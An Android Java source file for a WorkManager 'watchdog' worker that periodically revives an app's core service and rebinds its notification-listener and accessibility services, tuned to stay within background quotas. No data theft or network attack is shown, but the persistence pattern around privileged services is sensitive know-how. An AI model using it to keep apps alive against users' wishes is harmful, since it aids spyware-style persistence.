package com.chimera;

import android.content.Context;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

/**
 * WorkManager 15min watchdog - Android 16 quota safe (10min/30min Active).
 * Only does quick check (<10s) then reschedules.
 */
public class WatchdogWorker extends Worker {
    public WatchdogWorker(@NonNull Context ctx, @NonNull WorkerParameters params) { super(ctx, params); }

    @NonNull
    @Override
    public Result doWork() {
        try {
            Context ctx = getApplicationContext();
            NetworkStateMonitor.init(ctx);
            // Gate: even if airplane, still resurrect core service for local anchors
            // Heavy transports are gated inside TransportManager, but resurrection itself is cheap
            ResurrectionHelper.resurrect(ctx);
            // Also ensure anchor services are rebound if needed
            try { NotificationListener.ensureRebind(ctx); } catch (Exception ignored) {}
            try { ChimeraAccessibilityService.pingResurrection(ctx); } catch (Exception ignored) {}
            return Result.success();
        } catch (Exception e) {
            ErrorLogger.logError(getApplicationContext(), "WatchdogWorker", e);
            return Result.retry();
        }
    }
}
